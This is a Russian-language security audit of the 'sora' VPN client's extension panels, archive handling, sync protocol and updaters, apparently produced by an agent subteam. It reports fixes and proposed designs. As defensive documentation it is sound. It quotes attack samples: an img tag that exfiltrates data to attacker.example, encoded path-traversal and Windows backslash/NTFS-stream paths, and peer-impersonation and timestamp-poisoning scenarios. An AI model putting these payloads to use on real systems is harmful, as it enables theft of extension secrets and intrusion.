# Final Audit — Partial 02: Security (adversarial)

- Агент: подкоманда №2, security / adversarial
- Дата: 2026-10-20
- Репозитории: `~/workspace/bug-hunt/sora`, `~/workspace/bug-hunt/sora-legacy`, ветка `bugfix/audit-2026-10-19`
- Контекст сверен с: `sora-audit.md`, `sora-legacy-audit.md`, `REVIEW-5PASS.md`, `POWER-RUN.md`, `EXTENSIONS-40.md`, `TSPU-SOLUTIONS.md` — закрытое не дублирую, проверял новые поверхности и регрессии.
- Коммит фиксов: `f155f0f` `[final-audit] close panel exfil channels and harden archive paths` (только 3 файла, проверен `diff HEAD` перед коммитом).
- Проверки Go: `cd core && go build ./ext/... && go vet ./ext/` — зелёные; `go test -count=1 ./ext/` — `ok`.
- Dart: тулчейна нет (как и у всех предыдущих волн) — изменения в `panel_screen.dart`/`package.dart` только вычитаны, на dev-машине нужен `flutter analyze` + ручной тест панелей.

## Честность

- «Проверено кодом» = прочитал исходник и/или прогнал сборку/тест.
- «Предположение» помечено явно (например, точная семантика `File.absolute` по `..` в Dart — зависит от рантайма; фикс написан так, чтобы работать при любой семантике).

## Исправлено кодом (коммит f155f0f)

### F-1 [High] CSP панелей расширений: `connect-src 'none'` не блокировал эксфильтрацию

Файлы:
- `app/lib/src/ui/extensions/panel_screen.dart:31-52` (новая константа `_panelContentSecurityPolicy`), `:148-152` (заголовок ответа)
- `core/ext/store.go:385-400` (константа `panelCSP`, meta-тег)

Сценарий атаки: EXTENSIONS-40 и POWER-RUN считали дыру закрытой — на каждый ответ loopback-сервера ставился `Content-Security-Policy: connect-src 'none'` (+ meta в Go-extract). Но `connect-src` по спецификации CSP управляет только fetch/XHR, WebSocket, EventSource, sendBeacon/navigator.sendBeacon. Подресурсные загрузки — `img-src`, `media-src`, `font-src`, `style-src`, `worker-src` — при отсутствии своих директив падают на `default-src`, который был не задан (разрешено всё). Вредоносное расширение с `connections.read` эксфильтрует данные одним тегом:

```html
<img src="https://attacker.example/?d=ENCODED_HOSTS">
```

Загрузка изображения не подчиняется `connect-src`. То же работает через `<link rel=stylesheet>`, шрифты, `<video>`, Worker (скрипт с удалённого URL, у которого затем полный доступ к `window.soraExt`).

Фикс: политика расширена до полного lockdown — `default-src 'self'; connect-src 'none'; img-src 'self' data: blob:; media-src 'self'; font-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'; frame-ancestors 'none'` в HTTP-заголовке; та же политика (без `frame-ancestors`, он игнорируется в meta) в Go `panelCSP`, который `Rollback` вырезает через `bytes.Replace` по той же константе — консистентность сохранена. Собственные ассеты панели (тот же loopback-origin = `'self'`) продолжают работать; внешний сетевой трафик из панелей запрещён полностью — это и есть задокументированный интент («панель не делает своих сетевых запросов»).

### F-2 [Medium] Path traversal в loopback-сервере панелей (Dart)

Файл: `app/lib/src/ui/extensions/panel_screen.dart:82-128` (`_LocalPanelServer._handle`).

Было: `File('$root${req.uri.path.replaceAll('/', sep)}')` + проверка `file.absolute.path.startsWith(rootCanonical)`. Проблема: `Uri.path` содержит декодированные сегменты (`%2e%2e` → `..`), а `File.absolute` в Dart не обязан лексически нормализовывать `..` (зависит от платформы/рантайма). Если не нормализует — строковый префикс-чек пропускает `/..%2f..%2f<id>.settings.json`.

Сценарий атаки: вредоносная панель в том же WebView открывает `<iframe src="/..%2f..%2fother-ext.settings.json">`. Навигация разрешена делегатом (тот же origin), документ — same-origin JSON, родительский JS читает `iframe.contentDocument` → чтение настроек соседних расширений (там могут быть API-ключи и прочее из `settings_schema`). Bridge при этом не нужен.

Фикс: каждый сегмент пути декодируется (`Uri.decodeComponent`) и валидируется отдельно — запрещены `.`, `..`, `/`, `\`, `:` после декодирования; сегменты пересобираются лексически внутри root; старый префикс-чек оставлен как belt-and-suspenders. При любой семантике `File.absolute` выход за root невозможен. Замечание: имена файлов с `:` легитимны на Linux, но в пакетах `.soraext` они запрещены форматом (Go `isSafeArchivePath` и исправленный Dart `_isSafePath`), так что реальные панели не пострадают.

### F-3 [Medium] Dart `_isSafePath` не отклонял `\` и `:` (расхождение с Go)

Файл: `app/lib/src/ext/package.dart:196-206`.

Go `isSafeArchivePath` (усилен в EXTENSIONS-40, покрыт `zip_path_test.go`) отклоняет обратные слэши и двоеточия — на Windows `\` это разделитель (`..\..\evil`), `:` — буква диска или NTFS ADS (`panel.html:evil`, `C:\evil`). Dart-зеркало этого не делало: отклоняло только ведущие `/` и `\`. Пакет с `..\..\evil.txt` проходил фазу `open()`, дальше безопасность держалась только на containment-чеке при распаковке (та же неопределённость `File.absolute`, что в F-2) и `panel.html:evil` записывался бы как альтернативный поток.

Фикс: `_isSafePath` теперь зеркалит Go — `name.contains('\\') || name.contains(':') → false`. Применяется и к записям архива, и к путям в `checksums.txt`.

## Спеки (крупное — кодом не трогал, нужен ревью владельца)

### S-1 [Medium] Sync: идентичность пира не привязана к ключу Noise-хендшейка

Файлы: `service/sync/transport/transport.go` (`dial`/`accept`, ~строки 300-440), `service/sync/api/syncloop.go` (`handleSyncConn`), `service/sync/api/pairing.go` (`Join`, `handlePairingConn`).

Факты (проверено кодом):
- `runHandshake` возвращает `res.peerKey = hs.PeerStatic()`; `DialKnown`/`AcceptKnown` сверяют его с реестром. Верно.
- Но `c.Peer` (структура `Identity{DeviceID, DeviceName, PublicKey}`) приходит из `exchangeIdentities` — самозаявленного JSON поверх канала — и **никогда не сверяется** с `res.peerKey`.
- `api.upsertPeer(c.Peer.DeviceID, c.Peer.DeviceName, base64(c.Peer.PublicKey))` пишет в реестр именно самозаявленные значения.

Сценарий атаки: скомпрометированное/злонамеренное уже спаренное устройство (прошедшее `AcceptKnown` своим легитимным ключом) в `exchangeIdentities` заявляет `DeviceID = "laptop-id"` (чужой пир) и `PublicKey = <свежий ключ, приватный у атакующего>`. Демон перезаписывает запись laptop новым ключом. Дальше: настоящий laptop отвергается (`verify` по реестру не находит его ключ → DoS), а атакующий, владея приватным ключом к заявленному публичному, может синкаться **под видом laptop** и пушить документы (подписки с токенами, настройки) на другие устройства. Та же несвязанность в `handlePairingConn`/`Join`: заявленный long-term ключ спаренного устройства криптографически не доказан (в pairing-хендшейке static — эфемерный ключ инвайта; владение long-term ключом никто не проверяет).

Предлагаемый фикс (дизайн, не код):
1. `transport.Conn` должен отдавать `PeerKey [32]byte` = `res.peerKey` хендшейка.
2. В `DialKnown`/`AcceptKnown`-путях (`SyncPeer`, `handleSyncConn`): требовать `c.Peer.PublicKey == PeerKey` и `c.Peer.DeviceID == <id, под которым ключ числится в реестре>`; `upsertPeer` вызывать только с проверенными значениями (id из реестра, ключ из хендшейка), а не из JSON.
3. В pairing-путях: после `confirmToken` потребовать proof-of-possession long-term ключа (например, подпись channel binding long-term ключом) либо явно документировать, что ключ в pairing — TOFU и помечать запись как `unverified_until_first_sync`.
4. Добавить тесты: зловредный пир с чужим DeviceID отвергается; подмена ключа в JSON не влияет на реестр.

### S-2 [Medium] Sync-протокол: pull не сверяет документ с запросом/инвентарём; `updated_at` без границ

Файл: `service/sync/sync/sync.go` (`runInitiator.pull`, `runResponder`, `fromWire`), `service/sync/api/http.go` (`handleDocPut`).

Факты: `pull(ctx, kind, name)` отправляет `get{kind,name}`, а ответ `doc` принимается как есть — `Kind`/`Name` из `wireDoc` не сверяются с запрошенным, `Hash` не сверяется с инвентарём (`pm.Hash`). Злоумышленник-пир (спаренное устройство) может на `get` ответить документом под другим kind/name — он будет записан через `store.Put` под атакующим именем. `UpdatedAt` — произвольное int64: пир ставит `updated_at = 2^62` на `subscriptions/list` → last-write-wins навсегда блокирует легитимные обновления (poisoning без возможности восстановления, кроме ручной правки). Тот же вектор через HTTP API: `handleDocPut` принимает любой `updated_at > 0` (там caller — локальное приложение с bearer-токеном, т.е. доверенный, но sync-путь — нет).

Предлагаемый фикс: в `pull` сверять `doc.Kind == kind && doc.Name == name` и `doc.Hash == pm.Hash` (или, минимум, kind/name); в `fromWire`/`Put` клампить `updated_at` в `[0, now + maxSkew]` (напр. skew 24ч, документы из будущего дальше — отбрасывать/клампить и логировать); то же для `handleDocPut`.

### S-3 [Medium] `ext` net.fetch: DNS-rebinding → SSRF в LAN (пока недостижимо в проде)

Файлы: `core/ext/netfetch.go` (`checkURL`, `isIPLike`), `core/ext/manifest_v1ext.go` (`isIPLike`), `core/ext/worker.go` (`SetFetchTransport`).

Факты: `checkURL` запрещает IP-литералы (включая хитрые формы — `isIPLike` покрывает decimal/hex/octal, проверено), но allowlist состоит из **имён хостов**, а резолв делает `http.DefaultTransport` без какого-либо `DialContext`-валидатора. Автор расширения сам выбирает `network_hosts`, поэтому rebinding его же домена на `127.0.0.1`/`192.168.x.x`/link-local даёт SSRF во внутреннюю сеть жертвы через фоновый воркер. Редиректы перепроверяются (`CheckRedirect` → `checkURL`), но резолв редирект-цели — тот же. Смягчающее: `kill-switch` пауза есть; и — важно — в `core/cmd/sora-core/main.go` `Scheduler.SetFetchTransport` **не вызывается**, т.е. фоновые воркеры/net.fetch в прод-ядре сейчас не завайрены (шов есть, прод обязан передать tunnel-bound транспорт). Поэтому severity — Medium как библиотечный дефект, не активная дыра продакшена.

Предлагаемый фикс: кастомный `DialContext` в `Fetcher`, который резолвит имя, требует, чтобы **все** возвращённые IP были глобально-маршрутизируемыми (не loopback/private/link-local/multicast/unspecified), и дайлит только по проверенным IP с SNI = исходному имени; либо жёстко требовать tunnel-bound транспорт (тогда резолв делает VPN-сторона — rebinding бьёт уже по сети провайдера, что в threat model допустимо) и удалить direct-dial дефолт из не-тестового кода.

### S-4 [Low/Medium] Legacy C#: самообновление GUI без сверки контрольной суммы

Файл: `sora-legacy/legacy/v2rayN/v2rayN/Handler/UpdateHandle.cs`.

Факты (только вычитка, тулчейна нет): `VerifyCoreArchiveAsync` сверяет SHA-256 архива движка с `.dgst`-манифестом — но только для `v2fly/v2fly_v5/Xray` (`HasChecksumManifest`), для остальных движков и для **самого v2rayN** (`ECoreType.v2rayN`) — только downgrade-защита (`CompareVersions`, LEGACY-H1) без хэш-проверки. Плюс `.dgst`/`.sha256sum` тянутся с того же origin, что и архив (доверие = только TLS GitHub; подпись релиза отсутствует — задокументированное ограничение).

Предлагаемый фикс: публиковать `.dgst` для всех типов движков и GUI-ассета и требовать его наличие (fail-closed), либо вынести хэши в подписанный манифест; минимум — распространить `VerifyCoreArchiveAsync` на `ECoreType.v2rayN`.

### S-5 [Low] `sora-update` позволяет переопределить release-ключ через env

Файл: `sora/packaging/linux/sora-update`: `SORA_RELEASE_PUBKEY=${SORA_MINISIGN_PUBKEY:-REPLACE-ME-AFTER-KEY-CEREMONY}`.

Доверие: хелпер запускается от root через pkexec, а pkexec по умолчанию санитизирует окружение (неизвестные переменные не пробрасываются), так что переопределение работает только при ручном запуске от root — у атакующего уже root. Дополнительно: `cp -P` + проверка на symlink, копирование в root-owned `mktemp -d`, подпись проверяется до доверия хэшам, downgrade-защита, fail-closed на placeholder-ключе. Оставить как есть или убрать env-override, оставив только вшитый ключ.

### S-6 [Low] `PanelBridge.handle` — броски кастов вне try (robustness)

Файл: `app/lib/src/ext/bridge.dart:70-90`. `decoded as Map<String,dynamic>?` и `msg?['args'] as Map<String,dynamic>?` — вне `try`; панель, приславшая не-JSON-объект, роняет `handle()` исключением вместо штатного `{ok:false}`. Caller (`panel_screen.dart`) это ловит и отвечает `internal`, так что это только robustness панелей, не безопасность. При рефакторинге обернуть весь парсинг в try.

## Проверено adversarial-проходом, дыр нет (кратко)

- **IPC/авторизация**: неизвестные методы → только `AuthControl` (`core/control/authz.go:checkMethodAuth`, fail-closed); интерцепторы завайрены в `core/cmd/sora-core/main.go:375-385`; пиры верифицируются ядром (SO_PEERCRED / pipe tokens), `peerOf` видит сквозь `countedConn`-обёртку; Linux — polkit actions, Windows — active-session/admin. `ExtensionHost` на том же сокете: дополнительно per-extension токены (32 байта), карта `rpcPermissions` закрыта (неизвестный RPC → deny), `MintToken` требует control-token **и** `GrantedPermissions`-сверку с реестром (`main.go:436-439`); TTL 24ч, revoke при disable/uninstall; `WatchExtensionEvents` отдаёт только kind.
- **`.soraext`**: zip-slip в Go закрыт включая `\`/`:` (`zip_path_test.go`); zip-бомба — 3 фазы в Dart (central directory → declared limits + compression ratio 100 → bounded sink) и учёт реальных байт в Go; `checksums.txt` покрывает ровно все файлы; minisign trusted-comment связывает sha256 пейлоада; каталог: pin ключа автора (D1), continuity ключа (D2), revocation list fail-closed (кроме first-run — честно задокументировано); rollback перепроверяет N-1 по pin-ключу.
- **Обновления**: `sora-update` (root) проверяет minisign-подпись `SHA256SUMS` до доверия хэшам, fail-closed на placeholder-ключе, downgrade-защита, symlink-TOCTOU закрыты; Windows in-app путь честно отказывается (`UpdateError.signatureRequired`); staged updates тянут `.minisig` (POWER-RUN №1).
- **Bypass/nfqws/tpws**: все параметры стратегий валидируются allowlist-регулярками в `core/engine/validate.go` (split-pos, tamper, OOB-data, MSS, desync modes, fooling, filter порты/L7, fake-имена без путей); запуск — arg-вектором без shell; бинарники движков сверяются с `engines.digests` до exec, PATH не используется (SORA-H5); nfqws-стратегии fail-closed без executor'а.
- **Sync**: pairing `net.Listen(":0")` — осознанно LAN; Noise_XX + HMAC(token, channelBinding) после хендшейка, identity — только после подтверждения токена; mDNS-spoof → LAN-gate (`lanAddr`: loopback/private/link-local, тесты `TestJoinRejectsSpoofedNonLANAddr`); localhost HTTP API — только `127.0.0.1`, bearer 32 байта, constant-time; `DirStore.safeName` — traversal закрыт; pairing TTL 5 мин, семафоры хендшейков 4/8; QR-формат строгий (без фрагментов, без дублей ключей — Dart/Go паритет); бинарник резолвится по фиксированному пути, не PATH.
- **Legacy**: C# — TLS-валидация не отключается (нет `DangerousAcceptAny`/custom validation), downgrade-защита, geo-файлы сверяются с `.sha256sum` fail-closed, подписки парсятся fail-closed; Go-legacy — токены/редaктор портированы (A20).
- **Подписки**: только HTTPS, редиректы валидируются похопово, `dialChecked` + `isPrivateHost` (SORA-L11), лимиты тела, токен не попадает в ошибки.
- **Диагностика/редaкция**: `engine.Redactor` сеется секретами плана + паттерны (userinfo, uuid, key=value); `diagnostics.Collector` маскирует до экспорта и честно рапортует `Masked`; секреты не покидают процесс через ext host (инвариант «расширения никогда не видят секреты» — код подтверждает: `Connection`/`Server`/`Notify` не несут credential material).
- **Десериализация**: везде `encoding/json` в структуры с `DisallowUnknownFields` там, где это trust boundary (catalog, revocation); `yaml`/gob/`proto.Unmarshal` на недоверенных входах не найдены; `settings_schema` валидируется по типам (`validateSettingsValues`), неизвестные ключи отклоняются.

## Рекомендуемые follow-up

1. Dev-машина: `flutter analyze`, ручной тест панели (проверить, что CSP не ломает легитимные панели и `window.soraExt` работает), тест установки `.soraext` с бэк/слеш-путями (должен отклоняться).
2. Владелец: спеки S-1..S-4 — подтвердить приоритет; S-1 желательно до широкого rollout F9.
3. Key ceremony (minisign) — по-прежнему главный блокер team-подписей (каталог, revocation list, релизы).
